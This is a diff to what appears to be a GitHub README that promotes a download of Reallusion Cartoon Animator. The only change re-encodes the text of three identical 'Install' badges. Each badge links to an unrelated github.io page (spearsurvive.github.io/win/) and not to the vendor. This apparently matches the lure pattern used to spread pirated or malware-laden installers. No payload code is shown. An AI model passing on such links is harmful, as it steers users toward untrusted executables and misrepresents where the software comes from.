@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion%20Cartoon%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion+Cartoon+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Reallusion Cartoon Animator (formerly CrazyTalk Animator) is a 2D animation plat
 
 <div align="center">
 
-[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion%20Cartoon%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion+Cartoon+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Reallusion Cartoon Animator (formerly CrazyTalk Animator) is a 2D animation plat
 
 <div align="center">
 
-[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion%20Cartoon%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Reallusion Cartoon Animator](https://img.shields.io/badge/⬇_Install_Reallusion+Cartoon+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
